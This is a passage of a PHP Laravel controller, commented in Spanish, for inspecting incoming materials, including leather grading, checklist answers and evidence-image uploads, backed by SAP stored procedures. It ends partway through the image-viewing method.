<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Modelos\Siz_Incoming;
use App\Modelos\Siz_Checklist;
use App\Modelos\Siz_PielClases;
use App\Modelos\Siz_IncomImagen;
use App\Modelos\Siz_IncomDetalle;
use Illuminate\Support\Facades\DB;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;

class Mod_IncomingController extends Controller
{
    // index_incoming
    public function index_incoming()
    {
        $actividades = session('userActividades');
        $ultimo = count($actividades);
        return view('Mod_IncomingController.index_incoming', compact('actividades', 'ultimo'));
    }
    
    // AJAX: Buscar inspecciones con filtros de fecha (agrupadas)
    public function buscarInspecciones(Request $request)
    {
        try {
            $fechaDesde = $request->input('fecha_desde', '');
            $fechaHasta = $request->input('fecha_hasta', '');
            
            // Si no se envían fechas, usar los últimos 3 meses
            if (empty($fechaDesde)) {
                $fechaDesde = date('Y-m-d', strtotime('-3 months'));
            }
            
            if (empty($fechaHasta)) {
                $fechaHasta = date('Y-m-d');
            }
            
            // Consultar inspecciones agrupadas
            $inspeccionesAgrupadas = DB::connection('siz')->select("
                SELECT 
                    INC_docNum,
                    INC_lineNum,
                    INC_codMaterial,
                    INC_nomMaterial,
                    INC_nomProveedor,
                    INC_unidadMedida,
                    INC_esPiel,
                    MAX(INC_cantRecibida) as CANT_RECIBIDA,
                    SUM(INC_cantAceptada) as CANT_ACEPTADA,
                    SUM(INC_cantRechazada) as CANT_RECHAZADA,
                    COUNT(*) as NUM_INSPECCIONES,
                    MIN(INC_fechaInspeccion) as PRIMERA_INSPECCION,
                    MAX(INC_fechaInspeccion) as ULTIMA_INSPECCION
                FROM Siz_Incoming
                WHERE INC_borrado = 'N'
                    AND CAST(INC_fechaInspeccion AS DATE) >= ?
                    AND CAST(INC_fechaInspeccion AS DATE) <= ?
                GROUP BY 
                    INC_docNum,
                    INC_lineNum,
                    INC_codMaterial,
                    INC_nomMaterial,
                    INC_nomProveedor,
                    INC_unidadMedida,
                    INC_esPiel
                ORDER BY 
                    MAX(INC_fechaInspeccion) DESC
            ", [$fechaDesde, $fechaHasta]);
            
            return response()->json($inspeccionesAgrupadas);
        } catch (\Exception $e) {
            return response()->json([
                "error" => "Error al obtener las inspecciones: " . $e->getMessage()
            ], 500);
        }
    }
    
    // AJAX: Obtener detalle de inspecciones agrupadas
    public function detalleInspeccionesAgrupadas(Request $request)
    {
        try {
            $docNum = $request->input('doc_num');
            $lineNum = $request->input('line_num');
            $codMaterial = $request->input('cod_material');
            
            // Obtener todas las inspecciones del grupo
            $inspecciones = Siz_Incoming::on('siz')
                ->where('INC_docNum', $docNum)
                ->where('INC_lineNum', $lineNum)
                ->where('INC_codMaterial', $codMaterial)
                ->where('INC_borrado', 'N')
                ->orderBy('INC_fechaInspeccion', 'desc')
                ->get();
            
            if ($inspecciones->isEmpty()) {
                return response()->json([
                    'success' => false,
                    'msg' => 'No se encontraron inspecciones'
                ]);
            }
            
            // Obtener checklist
            $checklist = Siz_Checklist::on('siz')
                ->where('CHK_activo', 'S')
                ->where('CHK_area', '001')
                ->orderBy('CHK_orden')
                ->get();
            
            // Recopilar todas las respuestas de todas las inspecciones
            $respuestasConsolidadas = [];
            $imagenesConsolidadas = [];
            
            foreach ($inspecciones as $inspeccion) {
                // Obtener respuestas del checklist
                $respuestas = Siz_IncomDetalle::on('siz')
                    ->where('IND_incId', $inspeccion->INC_id)
                    ->get();
                
                foreach ($respuestas as $respuesta) {
                    $chkId = $respuesta->IND_chkId;
                    
                    // Solo agregar si es Cumple o No Cumple (ignorar No Aplica)
                    if ($respuesta->IND_estado === 'C' || $respuesta->IND_estado === 'N') {
                        if (!isset($respuestasConsolidadas[$chkId])) {
                            $respuestasConsolidadas[$chkId] = [
                                'estado' => $respuesta->IND_estado,
                                'observaciones' => [],
                                'cantidades' => [],
                                'fecha_inspeccion' => $inspeccion->INC_fechaInspeccion,
                                'inspector' => $inspeccion->INC_nomInspector
                            ];
                        }
                        
                        if ($respuesta->IND_observacion) {
                            $respuestasConsolidadas[$chkId]['observaciones'][] = [
                                'texto' => $respuesta->IND_observacion,
                                'fecha' => $inspeccion->INC_fechaInspeccion,
                                'inspector' => $inspeccion->INC_nomInspector
                            ];
                        }
                        
                        if ($respuesta->IND_cantidad) {
                            $respuestasConsolidadas[$chkId]['cantidades'][] = [
                                'cantidad' => $respuesta->IND_cantidad,
                                'fecha' => $inspeccion->INC_fechaInspeccion
                            ];
                        }
                    }
                }
                
                // Obtener imágenes
                $imagenes = Siz_IncomImagen::on('siz')
                    ->where('IMG_incId', $inspeccion->INC_id)
                    ->where('IMG_borrado', 'N')
                    ->get();
                
                foreach ($imagenes as $img) {
                    $chkId = $img->IMG_descripcion;
                    if (!isset($imagenesConsolidadas[$chkId])) {
                        $imagenesConsolidadas[$chkId] = [];
                    }
                    $imagenesConsolidadas[$chkId][] = [
                        'id' => $img->IMG_id,
                        'ruta' => $img->IMG_ruta,
                        'archivo' => basename($img->IMG_ruta),
                        'fecha' => $inspeccion->INC_fechaInspeccion
                    ];
                }
            }
            
            return response()->json([
                'success' => true,
                'inspecciones' => $inspecciones,
                'checklist' => $checklist,
                'respuestas' => $respuestasConsolidadas,
                'imagenes' => $imagenesConsolidadas,
                'resumen' => [
                    'doc_num' => $docNum,
                    'material' => $inspecciones[0]->INC_nomMaterial,
                    'codigo_material' => $codMaterial,
                    'proveedor' => $inspecciones[0]->INC_nomProveedor,
                    'cant_recibida' => $inspecciones[0]->INC_cantRecibida,
                    'cant_aceptada' => $inspecciones->sum('INC_cantAceptada'),
                    'cant_rechazada' => $inspecciones->sum('INC_cantRechazada'),
                    'num_inspecciones' => $inspecciones->count()
                ]
            ]);
            
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'msg' => 'Error al obtener el detalle: ' . $e->getMessage()
            ]);
        }
    }
    
    // AJAX: Obtener resumen consolidado de clases de piel
    public function resumenClasesPiel(Request $request)
    {
        try {
            $docNum = $request->input('doc_num');
            $lineNum = $request->input('line_num');
            $codMaterial = $request->input('cod_material');
            
            // Obtener todas las inspecciones del grupo
            $inspecciones = Siz_Incoming::on('siz')
                ->where('INC_docNum', $docNum)
                ->where('INC_lineNum', $lineNum)
                ->where('INC_codMaterial', $codMaterial)
                ->where('INC_borrado', 'N')
                ->where('INC_esPiel', 'S')
                ->orderBy('INC_fechaInspeccion', 'desc')
                ->get();
            
            if ($inspecciones->isEmpty()) {
                return response()->json([
                    'success' => false,
                    'msg' => 'No se encontraron inspecciones de piel'
                ]);
            }
            
            // Consolidar clases de piel
            $totalClaseA = 0;
            $totalClaseB = 0;
            $totalClaseC = 0;
            $totalClaseD = 0;
            $detalleInspecciones = [];
            
            foreach ($inspecciones as $inspeccion) {
                $piel = Siz_PielClases::on('siz')
                    ->where('PLC_incId', $inspeccion->INC_id)
                    ->where('PLC_borrado', 'N')
                    ->first();
                
                if ($piel) {
                    $totalClaseA += $piel->PLC_claseA;
                    $totalClaseB += $piel->PLC_claseB;
                    $totalClaseC += $piel->PLC_claseC;
                    $totalClaseD += $piel->PLC_claseD;
                    
                    $detalleInspecciones[] = [
                        'inc_id' => $inspeccion->INC_id,
                        'fecha' => $inspeccion->INC_fechaInspeccion,
                        'inspector' => $inspeccion->INC_nomInspector,
                        'cant_aceptada' => $inspeccion->INC_cantAceptada,
                        'clase_a' => $piel->PLC_claseA,
                        'clase_b' => $piel->PLC_claseB,
                        'clase_c' => $piel->PLC_claseC,
                        'clase_d' => $piel->PLC_claseD
                    ];
                }
            }
            
            // Calcular totales y verificar si está completo
            $cantRecibida = $inspecciones[0]->INC_cantRecibida;
            $totalAceptado = $inspecciones->sum('INC_cantAceptada');
            $totalRechazado = $inspecciones->sum('INC_cantRechazada');
            $totalClases = $totalClaseA + $totalClaseB + $totalClaseC + $totalClaseD;
            
            // Determinar si la inspección está completa
            $porRevisar = $cantRecibida - $totalAceptado - $totalRechazado;
            $esParcial = $porRevisar > 0.001; // Tolerancia para decimales
            
            // Calcular porcentajes sobre la cantidad RECIBIDA
            $porcentajes = [
                'clase_a' => $cantRecibida > 0 ? ($totalClaseA / $cantRecibida * 100) : 0,
                'clase_b' => $cantRecibida > 0 ? ($totalClaseB / $cantRecibida * 100) : 0,
                'clase_c' => $cantRecibida > 0 ? ($totalClaseC / $cantRecibida * 100) : 0,
                'clase_d' => $cantRecibida > 0 ? ($totalClaseD / $cantRecibida * 100) : 0
            ];
            
            return response()->json([
                'success' => true,
                'resumen' => [
                    'doc_num' => $docNum,
                    'material' => $inspecciones[0]->INC_nomMaterial,
                    'codigo_material' => $codMaterial,
                    'proveedor' => $inspecciones[0]->INC_nomProveedor,
                    'cant_recibida' => $cantRecibida,
                    'cant_aceptada' => $totalAceptado,
                    'cant_rechazada' => $totalRechazado,
                    'por_revisar' => $porRevisar,
                    'es_parcial' => $esParcial
                ],
                'totales' => [
                    'clase_a' => $totalClaseA,
                    'clase_b' => $totalClaseB,
                    'clase_c' => $totalClaseC,
                    'clase_d' => $totalClaseD,
                    'total' => $totalClases
                ],
                'porcentajes' => $porcentajes,
                'detalle_inspecciones' => $detalleInspecciones
            ]);
            
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'msg' => 'Error al obtener el resumen de piel: ' . $e->getMessage()
            ]);
        }
    }

    // Muestra la vista principal de inspección
    public function index_inspeccion()
    {
        $actividades = session('userActividades');
        $ultimo = count($actividades);
        return view('Mod_IncomingController.index_inspeccion', compact('actividades', 'ultimo'));
    }
    // AJAX: Buscar materiales por número de entrada
    public function buscarMateriales(Request $request)
    {
        $numeroEntrada = $request->input('numero_entrada');
        
        // 1. Obtener información de entrada desde SAP (conexión por defecto)
        $materialesSAP = DB::select('EXEC SIZ_Calidad_EntradaMaterial @NumeroEntrada = ?', [$numeroEntrada]);
        
        // 2. Obtener cantidades de inspección desde BD siz
        $inspecciones = DB::connection('siz')->select('EXEC SIZ_Calidad_InspeccionMaterial @NumeroEntrada = ?', [$numeroEntrada]);
        
        // 3. Combinar los resultados
        $materialesCombinados = [];
        foreach ($materialesSAP as $materialSAP) {
            // Buscar si existe inspección para este material
            $inspeccion = null;
            foreach ($inspecciones as $ins) {
                if ($ins->CODIGO_ARTICULO == $materialSAP->CODIGO_ARTICULO && intval($ins->LINE_NUM) == intval($materialSAP->LineNum)) {
                    $inspeccion = $ins;
                    break;
                }
            }
            
            if ($inspeccion) {
                // Si hay inspecciones, usar los datos de inspección
                $materialSAP->CAN_INSPECCIONADA = $inspeccion->CAN_INSPECCIONADA;
                $materialSAP->CAN_RECHAZADA = $inspeccion->CAN_RECHAZADA;
                $materialSAP->POR_REVISAR = $inspeccion->POR_REVISAR;
                $materialSAP->ID_INSPECCION = $inspeccion->ID_INSPECCION;
                
                // Obtener todas las inspecciones previas para este material
                $inspeccionesPrevias = Siz_Incoming::on('siz')
                    ->where('INC_docNum', $numeroEntrada)
                    ->where('INC_codMaterial', $materialSAP->CODIGO_ARTICULO)
                    ->where('INC_lineNum', $materialSAP->LineNum)
                    ->where('INC_borrado', 'N')
                    ->orderBy('INC_id', 'desc')
                    ->get();
                
                $materialSAP->inspecciones = $inspeccionesPrevias->toArray();
            } else {
                // Si no hay inspecciones, inicializar en 0
                $materialSAP->CAN_INSPECCIONADA = 0;
                $materialSAP->CAN_RECHAZADA = 0;
                $materialSAP->POR_REVISAR = $materialSAP->CANTIDAD;
                $materialSAP->ID_INSPECCION = 0;
                $materialSAP->inspecciones = [];
            }
            
            // 4. Obtener lote para materiales de piel (grupo 113)
            if ($materialSAP->GRUPO == 113) {
                $lote = DB::select('SELECT TOP (1) OIBT.BatchNum FROM OIBT WHERE OIBT.ItemCode = ? AND OIBT.BaseEntry = ?', 
                    [$materialSAP->CODIGO_ARTICULO, $materialSAP->BASE_ENTRY]);
                $materialSAP->LOTE = $lote ? $lote[0]->BatchNum : 'N/A';
            } else {
                $materialSAP->LOTE = 'N/A';
            }
            
            $materialesCombinados[] = $materialSAP;
        }
        
        return response()->json($materialesCombinados);
    }

    // AJAX: Obtener checklist y respuestas previas para un material
    public function getChecklist(Request $request)
    {
        $inc_id = $request->input('inc_id');
        $material = $request->input('material');
        
        // NO crear registro aquí, solo obtener checklist
        // El registro se creará en guardarInspeccion() cuando realmente se guarde
        
        $checklist = Siz_Checklist::on('siz')->where('CHK_activo', 'S')
        ->where('CHK_area', '001')
        ->orderBy('CHK_orden')->get();
        $respuestas = []; // No hay respuestas previas si es nueva inspección
        
        return response()->json([
            'checklist' => $checklist, 
            'respuestas' => $respuestas,
            'id_inspeccion' => 0 // Siempre 0 para nueva inspección
        ]);
    }

    // AJAX: Ver inspección previa (solo lectura)
    public function verInspeccion(Request $request)
    {
        $inc_id = $request->input('inc_id');
        
        // Obtener datos de la inspección
        $inspeccion = Siz_Incoming::on('siz')->where('INC_id', $inc_id)->first();
        
        if (!$inspeccion) {
            return response()->json(['error' => 'Inspección no encontrada'], 404);
        }
        
        // Obtener respuestas del checklist (solo las que están guardadas)
        $respuestas = Siz_IncomDetalle::on('siz')
            ->where('IND_incId', $inc_id)
            ->get()
            ->keyBy('IND_chkId');
        
        // Obtener todos los checklist activos
        $checklist = Siz_Checklist::on('siz')
            ->where('CHK_activo', 'S')
            ->where('CHK_area', '001')
            ->orderBy('CHK_orden')
            ->get();
        
        // Preparar respuestas para el frontend
        $respuestasFormateadas = [];
        foreach ($checklist as $item) {
            if (isset($respuestas[$item->CHK_id])) {
                // Convertir carácter a respuesta completa
                $estado = $respuestas[$item->CHK_id]->IND_estado;
                if ($estado === 'C') {
                    $respuestasFormateadas[$item->CHK_id] = 'Cumple';
                } elseif ($estado === 'N') {
                    $respuestasFormateadas[$item->CHK_id] = 'No Cumple';
                } else {
                    $respuestasFormateadas[$item->CHK_id] = 'No Aplica';
                }
                
                // Agregar observación si existe
                if ($respuestas[$item->CHK_id]->IND_observacion) {
                    $respuestasFormateadas[$item->CHK_id . '_observacion'] = $respuestas[$item->CHK_id]->IND_observacion;
                }
                
                // Agregar cantidad si existe
                if ($respuestas[$item->CHK_id]->IND_cantidad) {
                    $respuestasFormateadas[$item->CHK_id . '_cantidad'] = $respuestas[$item->CHK_id]->IND_cantidad;
                }
            } else {
                // Si no existe el registro, significa que es "No Aplica" por defecto
                $respuestasFormateadas[$item->CHK_id] = 'No Aplica';
            }
        }

        // Preparar datos de la inspección para el frontend
        $inspeccionData = [
            'LINE_NUM' => $inspeccion->INC_lineNum,
            'INC_id' => $inspeccion->INC_id,
            'CODIGO_ARTICULO' => $inspeccion->INC_codMaterial,
            'MATERIAL' => $inspeccion->INC_nomMaterial,
            'CAN_INSPECCIONADA' => $inspeccion->INC_cantAceptada,
            'CAN_RECHAZADA' => $inspeccion->INC_cantRechazada,
            'POR_REVISAR' => $inspeccion->INC_cantRecibida - $inspeccion->INC_cantAceptada - $inspeccion->INC_cantRechazada,
            'OBSERVACIONES_GENERALES' => $inspeccion->INC_notas,
            'INC_fechaInspeccion' => $inspeccion->INC_fechaInspeccion,
            'INC_nomInspector' => $inspeccion->INC_nomInspector,
            'LOTE' => $inspeccion->INC_lote
        ];
        
        // Obtener imágenes agrupadas por CHK_id
        $imagenes = Siz_IncomImagen::on('siz')
            ->where('IMG_incId', $inc_id)
            ->where('IMG_borrado','N')
            ->get();
        
        $imagenesPorChk = [];
        foreach ($imagenes as $img) {
            $chkId = $img->IMG_descripcion; // En este campo guardamos el CHK_id
            if (!isset($imagenesPorChk[$chkId])) { 
                $imagenesPorChk[$chkId] = []; 
            }
            $imagenesPorChk[$chkId][] = [
                'ruta' => $img->IMG_ruta,
                'id' => $img->IMG_id,
                'archivo' => basename($img->IMG_ruta)
            ];
        }

        return response()->json([
            'success' => true,
            'inspeccion' => $inspeccionData,
            'checklist' => $checklist,
            'respuestas' => $respuestasFormateadas,
            'imagenes' => $imagenesPorChk
        ]);
    }

    // AJAX: Guardar inspección (cantidades, checklist, piel, imágenes)
    public function guardarInspeccion(Request $request)
    {
        DB::connection('siz')->beginTransaction();
        try {
            $material = json_decode($request->input('material'), true);
            $piel = json_decode($request->input('piel'), true);
            $checklist = $request->input('checklist');
            $imagenes = $request->file('imagenes');
            $cantidadPorRevisar = $request->input('cantidad_por_revisar');
            $cantidadAceptada = $request->input('cantidad_aceptada');
            $observacionesGenerales = $request->input('observaciones_generales');
            $lote = $request->input('lote');
            $lineNum = intval($request->input('line_num'));
            // Crear nueva inspección parcial (no actualizar existente)
            $incoming = new Siz_Incoming();
            $incoming->setConnection('siz');
            $incoming->INC_docNum = $material['NOTA_ENTRADA'];
            $incoming->INC_codMaterial = $material['CODIGO_ARTICULO'];
            $incoming->INC_fechaRecepcion = $material['FECHA_RECEPCION'];
            $incoming->INC_codProveedor = $material['CODIGO_PROVEEDOR'];
            $incoming->INC_nomProveedor = $material['NOMBRE_PROVEEDOR'];
            $incoming->INC_numFactura = $material['NUM_FACTURA'];
            $incoming->INC_nomMaterial = $material['MATERIAL'];
            $incoming->INC_unidadMedida = $material['UDM'];
            $incoming->INC_cantRecibida = $material['CANTIDAD'];
            $incoming->INC_cantAceptada = $cantidadAceptada;
            $incoming->INC_cantRechazada = $cantidadPorRevisar - $cantidadAceptada;
            $incoming->INC_lineNum = $lineNum;
            // Obtener fecha de inspección del formulario o usar fecha actual
            $fechaInspeccion = $request->get('fecha_inspeccion');
            if ($fechaInspeccion) {
                // Convertir fecha YYYY-MM-DD a YYYY-MM-DD HH:MM:SS
                $incoming->INC_fechaInspeccion = $fechaInspeccion . ' ' . date('H:i:s');
            } else {
                $incoming->INC_fechaInspeccion = date("Y-m-d H:i:s");
            }
            $incoming->INC_notas = $observacionesGenerales;
            $incoming->INC_esPiel = ($material['GRUPO'] == 113) ? 'S' : 'N';
            $incoming->INC_borrado = 'N';
            $incoming->INC_creadoEn = date("Y-m-d H:i:s");
            $incoming->INC_actualizadoEn = date("Y-m-d H:i:s");
            $incoming->INC_codInspector = Auth::user()->U_EmpGiro;
            $incoming->INC_nomInspector = Auth::user()->getName();
            $incoming->INC_lote = $lote;
            $incoming->save();

            // Guardar respuestas del checklist (solo las que no son "No Aplica")
            if ($request->has('checklist')) {
                foreach ($request->input('checklist') as $chkId => $respuesta) {
                    if ($respuesta && $respuesta !== 'No Aplica') {
                        $detalle = new Siz_IncomDetalle();
                        $detalle->IND_incId = $incoming->INC_id;
                        $detalle->IND_chkId = $chkId;
                        
                        // Convertir respuesta completa a carácter
                        if ($respuesta === 'Cumple') {
                            $detalle->IND_estado = 'C';
                        } elseif ($respuesta === 'No Cumple') {
                            $detalle->IND_estado = 'N';
                        } else {
                            $detalle->IND_estado = 'A';
                        }
                        
                        // Agregar observación si existe
                        if ($request->has('checklist_observacion.' . $chkId)) {
                            $detalle->IND_observacion = $request->input('checklist_observacion.' . $chkId);
                        }
                        
                        // Si es "No Cumple", guardar la cantidad
                        if ($respuesta === 'No Cumple' && $request->has('checklist_cantidad.' . $chkId)) {
                            $detalle->IND_cantidad = $request->input('checklist_cantidad.' . $chkId);
                        }
                        
                        $detalle->IND_borrado = 'N';
                        $detalle->IND_creadoEn = date("Y-m-d H:i:s");
                        $detalle->IND_actualizadoEn = date("Y-m-d H:i:s");
                    $detalle->save();
                    }
                }
            }

            // Guardar clases de piel si aplica
            if ($incoming->INC_esPiel == 'S' && $piel) {
                $pielClases = new Siz_PielClases();
                $pielClases->setConnection('siz');
                $pielClases->PLC_incId = $incoming->INC_id;
                $pielClases->PLC_claseA = isset($piel['claseA']) ? ($piel['claseA'] == '' ? 0 : $piel['claseA']) : 0;
                $pielClases->PLC_claseB = isset($piel['claseB']) ? ($piel['claseB'] == '' ? 0 : $piel['claseB']) : 0;
                $pielClases->PLC_claseC = isset($piel['claseC']) ? ($piel['claseC'] == '' ? 0 : $piel['claseC']) : 0;
                $pielClases->PLC_claseD = isset($piel['claseD']) ? ($piel['claseD'] == '' ? 0 : $piel['claseD']) : 0;
                $pielClases->PLC_borrado = 'N';
                $pielClases->PLC_creadoEn = date("Y-m-d H:i:s");
                $pielClases->PLC_actualizadoEn = date("Y-m-d H:i:s");
                $pielClases->save();
            }
            
            // Guardar imágenes de evidencia
            $archivosEncontrados = false;
            $archivosEvidencia = [];
            
            // Buscar archivos de evidencia en el request
            foreach ($request->all() as $key => $value) {
                if (strpos($key, 'checklist_evidencias') !== false) {
                    if ($request->hasFile($key)) {
                        $archivosEncontrados = true;
                        $archivosEvidencia[$key] = $request->file($key);
                    }
                }
            }
            
            // También verificar si hay archivos en el formato de array
            if ($request->hasFile('checklist_evidencias')) {
                $archivosEncontrados = true;
                $archivosEvidencia['checklist_evidencias'] = $request->file('checklist_evidencias');
            }
            
            // Verificar si hay archivos en el formato específico que está llegando
            if (isset($request->file()['checklist_evidencias']) && is_array($request->file()['checklist_evidencias'])) {
                $archivosEncontrados = true;
                $archivosEvidencia['checklist_evidencias'] = $request->file()['checklist_evidencias'];
            }
            
            if ($archivosEncontrados) {
                $so = env('DB_DATABASE');
                if($so == 'SBO_Prueba') {
                    $directorioBase = 'D:\\QAS\\INCOMING\\' . $material['NOTA_ENTRADA'];
                } else {
                    $directorioBase = 'D:\\INCOMING\\' . $material['NOTA_ENTRADA'];
                }
                
                if (!file_exists($directorioBase)) {
                    mkdir($directorioBase, 0777, true);
                }
                
                // Procesar archivos encontrados
                foreach ($archivosEvidencia as $key => $archivos) {
                    if ($archivos) {
                        // El key es "checklist_evidencias" y los archivos están en formato array
                        // Necesitamos iterar sobre el array para obtener cada CHK_id
                        if ($key === 'checklist_evidencias' && is_array($archivos)) {
                            foreach ($archivos as $chk_id => $archivosChk) {
                                if ($archivosChk && is_array($archivosChk)) {
                                    // Procesar cada archivo del CHK_id
                                    foreach ($archivosChk as $img) {
                                        if ($img) {
                                            $extension = $img->getClientOriginalExtension();
                                            // Obtener nombre del checklist por CHK_id
                                            $chk = Siz_Checklist::on('siz')->where('CHK_id', $chk_id)->first();
                                            $chkNombre = $chk ? preg_replace('/[^A-Za-z0-9_-]+/', '', str_replace(' ', '_', $chk->CHK_descripcion)) : ('CHK_'.$chk_id);
                                            $nombre = $incoming->INC_id . '_' . $chkNombre . '_' . uniqid() . '.' . $extension;
                                            $rutaCompleta = $directorioBase . '\\' . $nombre;
                                            
                                            // Guardar archivo
                                            $img->move($directorioBase, $nombre);
                                            
                                            $imagen = new Siz_IncomImagen();
                                            $imagen->setConnection('siz');
                                            $imagen->IMG_incId = $incoming->INC_id;
                                            $imagen->IMG_ruta = $rutaCompleta;
                                            $imagen->IMG_descripcion = $chk_id;
                                            $imagen->IMG_cargadoPor = auth()->check() ? auth()->user()->name : 'sistema';
                                            $imagen->IMG_cargadoEn = date("Y-m-d H:i:s");
                                            $imagen->IMG_borrado = 'N';
                                            $imagen->save();
                                        }
                                    }
                                }
                            }
                        } else {
                            // Formato alternativo (compatibilidad)
                            preg_match('/checklist_evidencias\[(\d+)\]/', $key, $matches);
                            $chk_id = isset($matches[1]) ? $matches[1] : null;
                            
                            if ($chk_id) {
                                // Si es un array de archivos (múltiples imágenes)
                                if (is_array($archivos)) {
                                    foreach ($archivos as $img) {
                                        if ($img) {
                                            $extension = $img->getClientOriginalExtension();
                                            // Obtener nombre del checklist por CHK_id
                                            $chk = Siz_Checklist::on('siz')->where('CHK_id', $chk_id)->first();
                                            $chkNombre = $chk ? preg_replace('/[^A-Za-z0-9_-]+/', '', str_replace(' ', '_', $chk->CHK_descripcion)) : ('CHK_'.$chk_id);
                                            $nombre = $incoming->INC_id . '_' . $chkNombre . '_' . uniqid() . '.' . $extension;
                                            $rutaCompleta = $directorioBase . '\\' . $nombre;
                                            
                                            // Guardar archivo
                                            $img->move($directorioBase, $nombre);
                                            
                                            $imagen = new Siz_IncomImagen();
                                            $imagen->setConnection('siz');
                                            $imagen->IMG_incId = $incoming->INC_id;
                                            $imagen->IMG_ruta = $rutaCompleta;
                                            $imagen->IMG_descripcion = $chk_id;
                                            $imagen->IMG_cargadoPor = auth()->check() ? auth()->user()->name : 'sistema';
                                            $imagen->IMG_cargadoEn = date("Y-m-d H:i:s");
                                            $imagen->IMG_borrado = 'N';
                                            $imagen->save();
                                        }
                                    }
                                } else {
                                    // Si es un solo archivo (compatibilidad)
                                    $extension = $archivos->getClientOriginalExtension();
                                    // Obtener nombre del checklist por CHK_id
                                    $chk = Siz_Checklist::on('siz')->where('CHK_id', $chk_id)->first();
                                    $chkNombre = $chk ? preg_replace('/[^A-Za-z0-9_-]+/', '', str_replace(' ', '_', $chk->CHK_descripcion)) : ('CHK_'.$chk_id);
                                    $nombre = $incoming->INC_id . '_' . $chkNombre . '_' . uniqid() . '.' . $extension;
                                    $rutaCompleta = $directorioBase . '\\' . $nombre;
                                    
                                    // Guardar archivo
                                    $archivos->move($directorioBase, $nombre);
                                    
                                    $imagen = new Siz_IncomImagen();
                                    $imagen->setConnection('siz');
                                    $imagen->IMG_incId = $incoming->INC_id;
                                    $imagen->IMG_ruta = $rutaCompleta;
                                    $imagen->IMG_descripcion = $chk_id;
                                    $imagen->IMG_cargadoPor = auth()->check() ? auth()->user()->name : 'sistema';
                                    $imagen->IMG_cargadoEn = date("Y-m-d H:i:s");
                                    $imagen->IMG_borrado = 'N';
                                    $imagen->save();
                                }
                            }
                        }
                    }
                }
            }

            DB::connection('siz')->commit();
            
            // Recargar datos de materiales usando ambos procedimientos por separado
            $materialesSAP = DB::select('EXEC SIZ_Calidad_EntradaMaterial @NumeroEntrada = ?', [$material['NOTA_ENTRADA']]);
            $inspecciones = DB::connection('siz')->select('EXEC SIZ_Calidad_InspeccionMaterial @NumeroEntrada = ?', [$material['NOTA_ENTRADA']]);
            
            // Combinar datos
            $materialesActualizados = [];
            foreach ($materialesSAP as $materialSAP) {
                $inspeccion = null;
                foreach ($inspecciones as $ins) {
                    if ($ins->CODIGO_ARTICULO == $materialSAP->CODIGO_ARTICULO && intval($ins->LINE_NUM) == intval($materialSAP->LineNum)) {
                        $inspeccion = $ins;
                        break;
                    }
                }
                
                if ($inspeccion) {
                    $materialSAP->CAN_INSPECCIONADA = $inspeccion->CAN_INSPECCIONADA;
                    $materialSAP->CAN_RECHAZADA = $inspeccion->CAN_RECHAZADA;
                    $materialSAP->POR_REVISAR = $inspeccion->POR_REVISAR;
                    $materialSAP->ID_INSPECCION = $inspeccion->ID_INSPECCION;
                    
                    // Obtener todas las inspecciones previas para este material
                    $inspeccionesPrevias = Siz_Incoming::on('siz')
                        ->where('INC_docNum', $material['NOTA_ENTRADA'])
                        ->where('INC_codMaterial', $materialSAP->CODIGO_ARTICULO)
                        ->where('INC_lineNum', $materialSAP->LineNum)
                        ->where('INC_borrado', 'N')
                        ->orderBy('INC_id', 'desc')
                        ->get();
                    
                    $materialSAP->inspecciones = $inspeccionesPrevias->toArray();
                } else {
                    $materialSAP->CAN_INSPECCIONADA = 0;
                    $materialSAP->CAN_RECHAZADA = 0;
                    $materialSAP->POR_REVISAR = $materialSAP->CANTIDAD;
                    $materialSAP->ID_INSPECCION = 0;
                    $materialSAP->inspecciones = [];
                }
                
                // Obtener lote para materiales de piel (grupo 113)
                if ($materialSAP->GRUPO == 113) {
                    try {
                        $lote = DB::select('SELECT TOP (1) OIBT.BatchNum FROM OIBT WHERE OIBT.ItemCode = ? AND OIBT.BaseEntry = ?', 
                            [$materialSAP->CODIGO_ARTICULO, $materialSAP->BASE_ENTRY]);
                        $materialSAP->LOTE = $lote ? $lote[0]->BatchNum : 'N/A';
                    } catch (\Exception $e) {
                        $materialSAP->LOTE = 'N/A';
                    }
                } else {
                    $materialSAP->LOTE = 'N/A';
                }
                
                $materialesActualizados[] = $materialSAP;
            }
            
            return response()->json([
                'success' => true, 
                'msg' => 'Inspección guardada correctamente',
                'id_inspeccion' => $incoming->INC_id,
                'materiales' => $materialesActualizados
            ]);
        } catch (\Exception $e) {
            DB::connection('siz')->rollBack();
            return response()->json(['success' => false, 'msg' => 'Error al guardar: '.$e->getMessage()]);
        }
    }
    
    /**
     * Obtener datos de piel para una inspección específica
     */
    public function verPiel(Request $request)
    {
        try {
            $incId = $request->get('inc_id');
            
            if (!$incId) {
                return response()->json([
                    'success' => false,
                    'msg' => 'ID de inspección requerido'
                ]);
            }
            
            // Buscar clases de piel para esta inspección
            $piel = Siz_PielClases::on('siz')
                ->where('PLC_incId', $incId)
                ->where('PLC_borrado', 'N')
                ->first();
            
            if ($piel) {
                return response()->json([
                    'success' => true,
                    'piel' => [
                        'claseA' => $piel->PLC_claseA,
                        'claseB' => $piel->PLC_claseB,
                        'claseC' => $piel->PLC_claseC,
                        'claseD' => $piel->PLC_claseD
                    ]
                ]);
            } else {
                return response()->json([
                    'success' => false,
                    'msg' => 'No se encontraron clases de piel para esta inspección'
                ]);
            }
            
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'msg' => 'Error al obtener datos de piel: ' . $e->getMessage()
            ]);
        }
    }

    /**
     * Descargar/ver imagen de evidencia de forma segura por ID
     */
    public function verImagen($id)
    {
        try {
            $img = Siz_IncomImagen::on('siz')->where('IMG_id', $id)->where('IMG_borrado','N')->first();
            
            if (!$img) {
                abort(404, 'Imagen no encontrada');
            }
            
            if (!file_exists($img->IMG_ruta)) {
                abort(404, 'Archivo de imagen no encontrado');
            }
            
            $path = $img->IMG_ruta;
            $filename = basename($path);
            
            // Detectar MIME de forma compatible
            $mime = function_exists('mime_content_type') ? mime_content_type($path) : 'application/octet-stream';
            if ($mime === 'application/octet-stream' && function_exists('finfo_open')) {
                $finfo = finfo_open(FILEINFO_MIME_TYPE);
                $detected = finfo_file($finfo, $path);
                if ($detected) { 
                    $mime = $detected; 
                }
                finfo_close($finfo);
            }
            
            $headers = [
                'Content-Type' => $mime,
